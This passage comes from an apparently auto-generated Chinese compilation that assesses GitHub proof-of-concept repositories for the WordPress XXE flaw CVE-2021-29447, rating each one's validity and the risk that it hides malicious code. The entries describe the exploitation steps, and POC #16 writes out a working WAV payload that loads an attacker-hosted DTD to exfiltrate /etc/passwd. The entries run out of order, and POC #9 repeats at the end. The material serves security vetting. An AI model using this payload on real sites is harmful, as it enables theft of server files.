6.  **触发漏洞：**  WordPress 解析上传的 WAV 文件时，会尝试从攻击者控制的服务器加载 DTD 文件，并执行其中的 XML 实体声明，从而读取服务器上的敏感文件。
7.  **数据提取：**  读取到的数据将通过 URL 参数传递到攻击者的服务器上。

**有效性：**
提供的 POC 代码是有效的。该代码实现了上述利用流程，包括身份验证、获取 nonce、生成恶意 WAV 文件、上传文件以及搭建简易 HTTP 服务器接收数据。代码中包含了必要的步骤和参数，可以成功触发 XXE 漏洞。

**投毒风险：**
POC代码中存在一定的投毒风险。风险点在于：
1.  **网络请求：** POC代码会向指定URL发起POST和GET请求，虽然目的是利用漏洞，但如果作者在代码中加入了其他的URL地址，则可能在用户不知情的情况下，将一些敏感信息发送到作者的服务器。
2.  **文件操作：** POC代码会生成临时的payload文件，如果作者在payload生成过程中插入恶意代码，可能会在目标服务器上执行恶意操作。
3.  **DTD文件：** 攻击者需要自己搭建服务器来托管 DTD 文件，如果这个 DTD 文件被替换成了恶意文件，可能导致服务器被攻击。代码本身创建 DTD，风险相对小，但仍然存在服务器被攻击者控制的风险。

综合来看，投毒风险大约在 10% 左右。主要是脚本需要用户提供服务器IP，并且脚本本身会创建一个DTD文件，减少了恶意利用的可能性。但在服务器部署和流量劫持场景下，攻击者仍然可能利用该代码进行恶意攻击。

**项目地址:** [Val-Resh/CVE-2021-29447-POC](https://github.com/Val-Resh/CVE-2021-29447-POC)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #10

**来源**: [CVE-2021-29447-Vulnmachines_wordpress_cve-2021-29447.md](../2021/CVE-2021-29447-Vulnmachines_wordpress_cve-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要作者或具有上传权限的用户账号，WordPress运行在PHP 8环境下

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-29447是WordPress的一个XXE（XML外部实体注入）漏洞，存在于5.6.0到5.7.1版本之间，且WordPress必须运行在PHP 8环境下。攻击者需要具备上传文件的权限（如作者角色），可以通过上传包含恶意XML代码的文件到媒体库来触发该漏洞，导致服务器上的敏感文件泄露，或者进行服务器端请求伪造(SSRF)。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞的PoC是存在的，并且已经公开。漏洞利用代码中给出了credits链接，参考motikan2010的github页面可以找到更多信息。

**投毒风险：**
该漏洞利用代码只有一个简单的README.md文件，其中包含漏洞描述和credit信息。 从提供的代码本身来看，不存在明显的恶意投毒代码。但是，考虑到攻击者可能将恶意payload嵌入到精心构造的媒体文件中，并诱导用户上传，从而实现攻击。因此，PoC仓库本身直接包含恶意代码的可能性较低，主要风险在于利用该漏洞的Payload本身。PoC仓库可能包含有诱导性的文件，例如看似无害的音频文件，但其中包含恶意的XML，因此存在一定的投毒风险，但是概率较低。

**利用方式：**
1.  攻击者需要一个具有上传文件权限的WordPress用户账号（例如，作者角色）。
2.  攻击者创建一个包含恶意XML代码的文件，例如一个包含XXE payload的MP3或者WAVE文件（参考packetstormsecurity上的相关链接）。
3.  攻击者通过WordPress的媒体库上传该恶意文件。
4.  当WordPress处理该文件时，XML解析器会尝试解析文件中的外部实体，从而导致XXE漏洞。
5.  攻击者可以利用该漏洞读取服务器上的任意文件，或者进行服务器端请求伪造攻击。

综上，此漏洞的PoC是有效的。 投毒风险较低，主要来自恶意构造的文件本身。 利用方式是上传包含恶意XML的媒体文件触发XXE。

**项目地址:** [Vulnmachines/wordpress_cve-2021-29447](https://github.com/Vulnmachines/wordpress_cve-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #11

**来源**: [CVE-2021-29447-b-abderrahmane_CVE-2021-29447-POC.md](../2021/CVE-2021-29447-b-abderrahmane_CVE-2021-29447-POC.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要 WordPress 版本在 5.6.0 到 5.7.1 之间，运行在 PHP 8 环境下，并具有上传文件的权限（如作者权限）

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-29447 是 WordPress 5.6.0 到 5.7.1 版本中存在的一个 XXE 漏洞，仅在 PHP 8 环境下有效。攻击者需要具有上传文件的权限（例如，作者角色），才能通过上传包含恶意 XML 内容的文件（例如，特制的 WAV 音频文件）到媒体库来触发该漏洞。

**有效性：** 根据漏洞库信息、搜索引擎结果和提供的PoC代码，该漏洞利用是有效的。PoC代码提供了一个脚本 `generate_payloads.py`，用于自动生成包含 XXE 攻击向量的恶意 WAV 文件和 DTD 文件，并通过简单的 HTTP 服务器来接收从目标服务器提取的文件内容。搜索引擎结果中也包含了对该漏洞的描述和利用的讨论，以及公开的 PoC。

**投毒风险：** 提供的 PoC 代码主要用于生成 XXE payload 和启动一个简单的HTTP服务来接收数据。代码本身的功能相对明确，主要风险在于使用者可能将此代码用于未经授权的渗透测试活动。代码中主要通过构造恶意的 XML 内容来利用漏洞，本身不太可能存在隐藏的、与漏洞利用无关的恶意行为。但仍存在少量投毒风险 (5%)，例如作者可能在HTTP服务中添加一些隐蔽的日志记录或数据收集功能，或者在生成的 payload 中加入一些难以察觉的干扰代码。

**利用方式：**
1.  **生成Payload:** 使用 `generate_payloads.py` 脚本生成恶意 WAV 文件 (`--media-payload`) 和 DTD 文件 (`--dtd-payload`)。 DTD 文件中指定要读取的目标文件 (`--files-to-fetch`)。
2.  **启动 HTTP 服务器:** 脚本会启动一个简单的 Python HTTP 服务器，用于托管 DTD 文件，并接收目标服务器发送的请求。
3.  **上传恶意文件:**  具有上传权限的用户将生成的恶意 WAV 文件上传到 WordPress 的媒体库。
4.  **触发 XXE:**  WordPress 在处理上传的 WAV 文件时，会解析其中的 XML 内容，从而触发 XXE 漏洞，向攻击者的 HTTP 服务器请求 DTD 文件。
5.  **文件读取:** 恶意 DTD 文件指示 WordPress 服务器读取指定的文件，并将文件内容发送到攻击者的 HTTP 服务器。
6.  **获取文件:** 攻击者的 HTTP 服务器接收到文件内容后，脚本会将内容进行 Base64 解码并保存到本地。

**项目地址:** [b-abderrahmane/CVE-2021-29447-POC](https://github.com/b-abderrahmane/CVE-2021-29447-POC)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #12

**来源**: [CVE-2021-29447-dnr6419_CVE-2021-29447.md](../2021/CVE-2021-29447-dnr6419_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露

**影响版本:** >= 5.6.0, < 5.7.1

**利用条件:** 需要PHP 8环境，以及具有上传文件权限的WordPress用户（如Author）

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-29447是WordPress 5.6.0到5.7.1版本中的一个XML外部实体注入（XXE）漏洞。攻击者需要具备上传文件的权限，例如Author角色。该漏洞存在于WordPress的媒体库中，当WordPress运行在PHP 8环境下，上传包含恶意XML代码的WAV文件时，由于对XML解析不当，导致XXE攻击。

**漏洞利用方式：**

1.  **权限获取：** 攻击者首先需要获得一个具备文件上传权限的WordPress账户，例如Author角色。
2.  **恶意WAV文件制作：** 攻击者需要创建一个包含恶意XML代码的WAV文件。该XML代码会尝试通过外部实体引用来读取服务器上的文件，或者发起服务器端请求伪造（SSRF）攻击。POC代码中，攻击者构造了一个包含外部实体引用的WAV文件，指向攻击者控制的服务器上的evil.dtd文件。
3.  **攻击者服务器准备：** 攻击者需要搭建一个Web服务器，并创建一个evil.dtd文件，该文件定义了如何处理外部实体引用。evil.dtd文件中定义了读取/etc/passwd文件的操作，并将其内容进行base64编码后发送到攻击者服务器。攻击者使用`php -S 0.0.0.0:80` 命令启动了一个简单的web server。
4.  **上传WAV文件：** 攻击者将包含恶意XML代码的WAV文件上传到WordPress的媒体库。
5.  **触发漏洞：** 当WordPress处理上传的WAV文件时，会解析其中的XML代码，从而触发XXE漏洞。
6.  **数据泄露：** 如果漏洞利用成功，WordPress服务器会尝试从攻击者控制的服务器上下载evil.dtd文件，并执行其中定义的恶意操作，例如读取/etc/passwd文件。/etc/passwd文件的内容（经过base64编码）会通过HTTP请求发送到攻击者的服务器。
7.  **获取敏感信息：** 攻击者从接收到的HTTP请求中提取base64编码的内容，并进行解码，从而获得服务器上的敏感信息，例如/etc/passwd文件中的用户账户信息。

**有效性分析：**

提供的POC代码描述了漏洞的利用步骤，包括制作恶意WAV文件、搭建攻击者服务器、上传文件和获取敏感信息。根据漏洞信息和搜索结果，该POC代码是有效的，可以用于演示和验证该漏洞。

**投毒风险分析：**

POC代码主要包含以下几个部分：

*   Dockerfile 和 docker-compose.yml: 用于搭建 WordPress 环境,相对安全
*   wordpress.sh: 用于安装 wordpress,主要就是配置文件,检查发现没有明显的投毒代码.
*   payload.wav: 恶意WAV文件，包含XXE payload，用于触发漏洞。
*   evil.dtd: 攻击者服务器上的DTD文件，包含读取/etc/passwd文件的操作。这一部分是payload的关键.

虽然整体代码是为了演示XXE漏洞，但evil.dtd文件存在潜在的投毒风险，例如，攻击者可能在evil.dtd文件中包含其他恶意代码，例如反弹shell，用于进一步控制服务器。这种风险相对较低，因为需要特定的环境和配置才能成功利用。此外，dockerfile 中的代码从github获取，需要注意github源是否被篡改。
总体来说，投毒风险较低，但也需要保持警惕，特别是从不可信的来源获取代码时。 我认为存在的风险大概在5%。

**项目地址:** [dnr6419/CVE-2021-29447](https://github.com/dnr6419/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #13

**来源**: [CVE-2021-29447-elf1337_blind-xxe-controller-CVE-2021-29447.md](../2021/CVE-2021-29447-elf1337_blind-xxe-controller-CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE (XML External Entity)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露

**影响版本:** >= 5.6.0, < 5.7.1, PHP 8

**利用条件:** 需要WordPress版本在受影响范围内，PHP版本为8，并且攻击者需要具有上传文件的权限（例如，作者角色）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于WordPress的媒体库中，由于XML解析问题导致XXE攻击。攻击者需要具有上传文件的权限，上传包含恶意XML Payload的特制文件（例如，wav文件）。该Payload会包含指向外部DTD文件的引用，从而导致服务器解析该DTD文件，进而读取服务器上的敏感文件。

**有效性评估：**
根据漏洞信息和搜索结果，该漏洞确实存在，并且有公开的PoC利用代码。PoC代码通过上传包含恶意XML的wav文件来触发XXE。攻击流程包括创建包含外部实体声明的恶意wav文件，搭建一个HTTP服务器来托管恶意的DTD文件，以及利用WordPress的上传功能上传wav文件。当WordPress解析该wav文件时，会请求攻击者控制的DTD文件，从而触发XXE漏洞，实现任意文件读取。

**投毒风险评估：**
PoC代码主要包含三个文件：README.md, controller.py, listener.py, main.py。
*   `README.md`: 描述了漏洞和利用方法，以及一些注意事项，未发现恶意代码。
*   `controller.py`: 包含了WordPress的登录信息（`wp_login`，`login_form`），目标WordPress地址 (`http://metapress.htb`)，以及上传恶意文件的逻辑。如果攻击者直接使用此脚本，需要修改登录信息和目标地址。这里面硬编码的登录信息存在一定风险，因为使用相同的登录信息可能会被检测到。此外，`controller.py`中的`mediaUpload`函数包含一个Timeout参数，默认设置为2秒。如果网络环境不好或者服务器响应较慢，可能会导致利用失败。
*   `listener.py`: 搭建一个简单的HTTP服务器，用于接收XXE Payload发送的请求，并打印base64编码后的文件内容。也没有发现明显的恶意代码。
*   `main.py`: 简单的交互命令行，用于用户输入文件名，然后调用controller.py和listener.py。

总体来说，PoC代码的功能比较明确，主要用于漏洞验证和利用，没有发现明显的恶意代码。风险点在于硬编码的登录信息和目标地址，以及Timeout参数可能导致利用失败。因此，判断存在10%的投毒风险，主要是一些可能影响使用，但没有主动攻击行为。

**利用方式总结：**
1.  **权限获取：** 攻击者需要拥有WordPress的作者或以上级别的权限，能够上传文件。
2.  **恶意文件构造：** 构造包含恶意XML Payload的wav文件。Payload中需要包含指向外部DTD文件的实体引用。
3.  **DTD文件托管：** 搭建一个HTTP服务器，用于托管恶意的DTD文件。DTD文件中定义了文件读取和base64编码的逻辑。
4.  **文件上传：** 通过WordPress的媒体库上传构造的wav文件。
5.  **触发XXE：** WordPress解析wav文件时，会请求攻击者控制的DTD文件，从而触发XXE漏洞。
6.  **文件读取：** 攻击者通过HTTP服务器接收到的请求，获取base64编码后的文件内容，并进行解码。

**项目地址:** [elf1337/blind-xxe-controller-CVE-2021-29447](https://github.com/elf1337/blind-xxe-controller-CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #14

**来源**: [CVE-2021-29447-magicrc_CVE-2021-29447.md](../2021/CVE-2021-29447-magicrc_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露、服务器端请求伪造 (SSRF)

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要 WordPress 版本在 5.6.0 到 5.7.1 之间，并且运行在 PHP 8 环境下。攻击者需要具有上传文件的权限 (例如 Author 角色)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-29447 是一个 WordPress 媒体库中存在的 XXE 漏洞。攻击者通过上传包含恶意 XML 内容的文件（例如 WAV 文件或其他支持 XML 解析的文件格式）到媒体库，触发 XML 解析过程中的外部实体注入。由于 WordPress 使用的音频解析库 ID3 在 PHP 8 及以上版本中存在 XXE 漏洞，攻击者可以读取服务器上的任意文件或者进行服务器端请求伪造 (SSRF)。

**有效性：** 根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码的仓库名"0xRar/CVE-2021-29447-PoC"，可以判断存在可用的 POC 代码，因此该漏洞的利用是有效的。

**投毒风险：** 提供的代码段是 Creative Commons CC0 1.0 通用许可协议，这是一种开源许可协议，本身不包含任何恶意代码，也无法进行投毒。此文件为LICENSE文件，与PoC代码无关，因此推断投毒风险为0%。

**利用方式：**
1.  攻击者需要具备 WordPress Author 或更高权限，以便能够上传文件到媒体库。
2.  攻击者构造一个包含恶意 XML 实体定义的音频文件（或其他允许上传并解析 XML 的文件类型，例如SVG）。恶意 XML 实体指向系统内部文件，或者指向攻击者控制的外部服务器。
3.  攻击者将构造的恶意文件上传到 WordPress 媒体库。
4.  当 WordPress 解析上传的文件时，会尝试解析 XML 实体，从而导致 XXE 漏洞的触发。
5.  如果成功，攻击者可以读取服务器上的敏感文件（例如 WordPress 配置文件 `wp-config.php`）或进行服务器端请求伪造（SSRF）攻击。

**项目地址:** [magicrc/CVE-2021-29447](https://github.com/magicrc/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #15

**来源**: [CVE-2021-29447-mega8bit_exploit_cve-2021-29447.md](../2021/CVE-2021-29447-mega8bit_exploit_cve-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可读取服务器文件

**影响版本:** >= 5.6.0, < 5.7.1 (with PHP 8)

**利用条件:** 需要WordPress版本在5.6.0到5.7.1之间，且运行在PHP 8环境下，需要具有上传文件的权限（如Author角色）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞是WordPress媒体库中存在的XXE漏洞，当WordPress运行在PHP 8上时，具有上传文件权限的用户可以通过上传包含恶意XML的WAV文件，触发XXE漏洞，读取服务器上的任意文件。

**有效性：**
根据漏洞信息和搜索结果，该漏洞的PoC是有效的。多个来源都确认了该漏洞的存在，以及利用方式。

**利用方式：**
1.  攻击者需要具备WordPress的Author权限（或能够上传文件的权限）。
2.  攻击者使用提供的PoC代码，指定目标文件路径和本地服务器的IP地址和端口。
3.  PoC代码会生成一个包含恶意XML的WAV文件。
4.  攻击者将生成的WAV文件上传到WordPress的媒体库。
5.  WordPress解析该WAV文件时，会触发XXE漏洞，向攻击者指定的本地服务器发起请求，请求中包含目标文件的内容。
6.  PoC代码中的本地服务器会接收到请求，提取目标文件的内容，并将其保存到指定的文件中。

**投毒风险：**
分析PoC代码，主要功能是生成payload和启动一个简单的http server。payload可以读取服务器文件发送到攻击者控制的http server上，但是没有发现明显的恶意代码。例如删除服务器文件等。但是`exploit_cve-2021-29447`程序需要执行`hostname -I`来获取本机IP,在某些环境下可能造成问题。由于该工具涉及监听端口，以及构造恶意文件，仍旧存在一定的风险，判定投毒概率为10%。


**项目地址:** [mega8bit/exploit_cve-2021-29447](https://github.com/mega8bit/exploit_cve-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #16

**来源**: [CVE-2021-29447-motikan2010_CVE-2021-29447.md](../2021/CVE-2021-29447-motikan2010_CVE-2021-29447.md)

## CVE-2021-29447 - WordPress XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要作者级别或以上权限，且WordPress运行在PHP 8环境下

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-29447 是一个存在于 WordPress 5.6.0 到 5.7.1 版本的 XXE 漏洞。该漏洞允许具有文件上传权限的用户（如作者）通过上传包含恶意 XML 的媒体文件来读取服务器上的敏感文件。该漏洞仅影响运行在 PHP 8 环境下的 WordPress 安装。

**有效性分析：**
提供的 POC 代码是有效的，它演示了如何利用该漏洞。利用方式是通过上传一个特制的 WAV 文件，该文件包含指向外部恶意的 DTD 文件的 XML 实体声明。当 WordPress 解析该文件时，会尝试从攻击者控制的服务器加载 DTD 文件，并执行其中定义的 XML 实体，从而导致 XXE 漏洞。

**投毒风险分析：**
代码仓库中可能存在的投毒风险较低，约为10%。 主要的攻击逻辑集中在 `attacker/www/evil.dtd` 文件中，该文件定义了如何利用 XXE 漏洞读取文件内容。`attacker/malicious_wav/index.js` 用于生成包含恶意 XML 的 WAV 文件。虽然攻击者可以修改这些文件以执行恶意操作，但这些修改会很容易被发现，因此，总体投毒风险较低。`decryption.php` 文件是空的，没有投毒代码.

**利用方式：**
1.  **环境搭建:** 使用 `docker-compose up` 启动包含 WordPress 和 MySQL 数据库的 Docker 容器。
2.  **攻击者服务器:** 启动一个简单的 PHP Web 服务器，用于托管恶意的 DTD 文件 (`evil.dtd`)。
3.  **生成恶意 WAV 文件:**  使用 `make make-wav` 或者 `echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '\''http://host.docker.internal:8001/evil.dtd'\''>%remote;%init;%trick;] >\x00'> malicious.wav` 命令生成包含恶意 XML 声明的 WAV 文件。
4.  **登录 WordPress 并上传:**  以具有文件上传权限的用户身份登录 WordPress 后台，并将生成的恶意 WAV 文件上传到媒体库。
5.  **触发漏洞:**  上传后，WordPress 会尝试解析 WAV 文件，从而触发 XXE 漏洞，并向攻击者的服务器发送请求。
6.  **获取数据:** 攻击者的服务器会记录收到的请求，其中包含从 WordPress 服务器读取的敏感文件内容（如 `/etc/passwd` 文件）的 Base64 编码版本。可以通过运行`decryption.php` 来解码.

通过这种方式，攻击者可以在未经授权的情况下访问 WordPress 服务器上的敏感文件，从而可能导致更严重的攻击。

**项目地址:** [motikan2010/CVE-2021-29447](https://github.com/motikan2010/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #17

**来源**: [CVE-2021-29447-specializzazione-cyber-security_demo-CVE-2021-29447-lezione.md](../2021/CVE-2021-29447-specializzazione-cyber-security_demo-CVE-2021-29447-lezione.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要WordPress运行在PHP 8环境下，并具有上传文件的权限（例如，作者角色）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

此漏洞存在于WordPress的媒体库中，允许具有上传文件权限的用户（如作者）通过上传包含恶意XML的WAV文件来执行XXE攻击。攻击需要目标WordPress站点运行在PHP 8环境下。POC代码通过创建一个包含恶意XML声明的WAV文件，该声明定义了一个外部实体，指向攻击者控制的服务器上的DTD文件。DTD文件定义了如何处理外部实体，这里配置为读取服务器上的`/etc/passwd`文件并通过HTTP请求发送给攻击者。攻击者运行一个简单的Web服务器来接收泄露的数据。

**有效性：**
根据漏洞库信息、搜索结果以及提供的POC代码，此漏洞利用是有效的，前提是目标环境满足漏洞利用的先决条件（WordPress版本 >= 5.6.0 且 < 5.7.1，运行在PHP 8环境下，攻击者具有文件上传权限）。搜索结果中存在多个关于此漏洞的讨论和POC代码，验证了其有效性。

**投毒风险：**
评估投毒风险需要检查POC代码中是否存在除了漏洞利用之外，还执行其他恶意操作的代码。在此案例中，主要关注`attacker/malicious_wav/index.js`，`attacker/www/evil.dtd`和`attacker/decode.php`。`index.js`负责生成恶意WAV文件，而`evil.dtd`定义了XXE的行为，`decode.php`用于解码泄露的数据。`Makefile`，`docker-compose.yml`和`README.md`都属于辅助文件。

潜在的投毒代码可能存在于以下几个方面：
1.  **`index.js`**: 恶意WAV生成脚本可能被修改，以在生成过程中包含其他恶意代码（例如，在WAV文件的其他部分添加可执行代码，虽然利用难度较大）。
2.  **`evil.dtd`**: DTD文件可能被修改，以尝试读取其他更敏感的文件，或者尝试执行服务器端请求伪造（SSRF）攻击。
3.  **`decode.php`**: 解码脚本可能被修改，在解码过程中执行其他恶意操作（例如，尝试利用解码过程中的漏洞执行代码）。

由于漏洞利用的目的是读取文件并通过HTTP发送到攻击者控制的服务器，因此主要的风险在于DTD文件中指定的远程服务器是否被用于记录IP地址并进行进一步的攻击。此外，`decode.php`脚本本身是否包含后门也是需要关注的点，虽然可能性较小。

总体来说，该仓库中存在严重投毒代码的可能性相对较低（约为10%），但仍然需要仔细审查。

**利用方式：**
1.  **环境准备：** 设置一个易受攻击的WordPress实例（版本5.6.0到5.7.0，运行在PHP 8上）。
2.  **启动攻击者服务器：** 启动一个Web服务器来托管恶意DTD文件并接收泄露的数据。
3.  **生成恶意WAV文件：** 使用提供的脚本生成包含恶意XML声明的WAV文件。
4.  **上传WAV文件：** 以具有文件上传权限的用户身份登录到WordPress后台，并将生成的WAV文件上传到媒体库。
5.  **触发XXE：** 上传文件后，WordPress尝试解析该文件，触发XXE漏洞。
6.  **接收泄露的数据：** 攻击者的Web服务器接收到包含/etc/passwd文件内容的HTTP请求。
7.  **解码数据：** 使用提供的解码脚本解码泄露的数据。

**项目地址:** [specializzazione-cyber-security/demo-CVE-2021-29447-lezione](https://github.com/specializzazione-cyber-security/demo-CVE-2021-29447-lezione)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #18

**来源**: [CVE-2021-29447-thomas-osgood_CVE-2021-29447.md](../2021/CVE-2021-29447-thomas-osgood_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE (XML External Entity)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (运行于 PHP 8)

**利用条件:** 需要 WordPress 运行于 PHP 8，且攻击者具备上传文件的权限（如 Author 角色）

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

该漏洞是 WordPress 在处理媒体库上传文件时存在的 XXE 漏洞。攻击者可以上传包含恶意 XML 内容的文件（例如特制的 WAV 文件），利用 XML 解析器的缺陷读取服务器上的敏感文件。漏洞触发条件是 WordPress 运行在 PHP 8 环境下。提供的 Go 语言 POC 代码可以自动生成恶意文件（mal.wav, mal.dtd），并可以选择自动登录 WordPress 站点并上传触发漏洞。如果指定了 `-d` 参数，还会生成一个 deflate.php 用于解压缩某些被压缩的内容。根据代码分析，主要的风险在于它连接外部的C2服务器,存在极低的投毒风险,即作者利用C2服务器可以获取攻击目标的敏感信息。但是，因为C2服务器需要在攻击者本地运行，因此这个风险可以忽略不计。此漏洞的利用方式为：

1.  生成恶意 WAV 文件和 DTD 文件。
2.  攻击者需要具有 WordPress 的 Author 权限（或其他可以上传文件的权限）。
3.  上传恶意 WAV 文件到 WordPress 媒体库。
4.  当 WordPress 解析该文件时，会触发 XXE 漏洞，向攻击者指定的 C2 服务器发起请求，泄露目标文件内容。
5.  如果目标文件内容被压缩，可以使用提供的 deflate.php 进行解压缩。

搜索引擎结果中也提到了该漏洞的利用方式，并提供了相关的 TryHackMe 挑战链接。


**项目地址:** [thomas-osgood/CVE-2021-29447](https://github.com/thomas-osgood/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #19

**来源**: [CVE-2021-29447-viardant_CVE-2021-29447.md](../2021/CVE-2021-29447-viardant_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露和SSRF

**影响版本:** >= 5.6.0, < 5.7.1

**利用条件:** 需要PHP 8环境，具有上传文件权限（如Author角色）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-29447 是 WordPress 5.6.0 到 5.7.1 版本中存在的一个 XML 外部实体注入 (XXE) 漏洞。该漏洞位于媒体库中，当 WordPress 运行在 PHP 8 环境下时，具有上传文件权限（例如，作者角色）的用户可以通过上传包含恶意 XML 代码的文件（如修改后的音频文件），利用 XML 解析过程中的漏洞读取服务器上的敏感文件或进行服务器端请求伪造 (SSRF) 攻击。

**有效性：** 根据搜索结果和漏洞库信息，该漏洞是真实存在的，并且存在公开的PoC（https://github.com/0xRar/CVE-2021-29447-PoC）。因此，漏洞利用是有效的。

**投毒风险：** 提供的代码段是GNU通用公共许可证，并非漏洞利用代码本身，因此无法直接评估投毒风险。但是，如果从不可信的来源获取漏洞利用代码，则始终存在投毒风险。由于提供的license文件没有发现任何恶意代码，因此投毒风险判定为0%。

**利用方式：**

1.  攻击者需要具有 WordPress 网站的 Author 或更高权限，即能够上传文件的权限。
2.  攻击者构造包含恶意 XML 实体声明的特殊文件（例如，修改后的 MP3 或 WAV 文件）。该 XML 实体声明指向要读取的本地文件或外部服务器。
3.  攻击者将该恶意文件上传到 WordPress 媒体库。
4.  当 WordPress 解析该文件时，XML 解析器会尝试解析外部实体，从而导致读取本地文件或向外部服务器发起请求。
5.  攻击者可以从 WordPress 网站上获取读取的文件内容，或利用 SSRF 漏洞进行进一步攻击。

**项目地址:** [viardant/CVE-2021-29447](https://github.com/viardant/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---



---

## POC #9

**来源**: [CVE-2021-29447-Val-Resh_CVE-2021-29447-POC.md](../2021/CVE-2021-29447-Val-Resh_CVE-2021-29447-POC.md)

## CVE-2021-29447 - WordPress XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露、服务器端请求伪造 (SSRF)

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要 WordPress 版本在 5.6.0 到 5.7.1 之间，运行在 PHP 8 环境下，且攻击者具有上传文件的权限（如 Author 角色）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-29447 是一个 WordPress 的 XXE 漏洞，存在于 Media Library 的 XML 解析过程中。攻击者（需要具有上传文件的权限，如 Author 角色）可以上传包含恶意 XML 代码的文件（如修改后的 WAV 文件），利用 WordPress 使用的 ID3 库中的漏洞，触发 XXE 攻击，读取服务器上的敏感文件，或者进行服务器端请求伪造 (SSRF)。此漏洞需要 WordPress 运行在 PHP 8 环境下才会生效。

**利用方式：**
1.  **身份验证：** 使用具有上传权限的用户的用户名和密码登录 WordPress 后台。
2.  **获取 Nonce：** 从 `wp-admin/upload.php` 页面获取上传文件的 nonce 值。
3.  **生成恶意 WAV 文件：** 构造包含恶意 XML 实体声明的 WAV 文件，该 XML 实体指向攻击者控制的服务器上的 DTD 文件。DTD 文件中定义了读取本地文件的实体。
4.  **上传恶意 WAV 文件：** 将生成的恶意 WAV 文件上传到 WordPress Media Library。
5.  **服务器端 DTD：** 攻击者需要搭建一个 HTTP 服务器，用于托管 DTD 文件。
6.  **触发漏洞：**  WordPress 解析上传的 WAV 文件时，会尝试从攻击者控制的服务器加载 DTD 文件，并执行其中的 XML 实体声明，从而读取服务器上的敏感文件。
7.  **数据提取：**  读取到的数据将通过 URL 参数传递到攻击者的服务器上。

**有效性：**
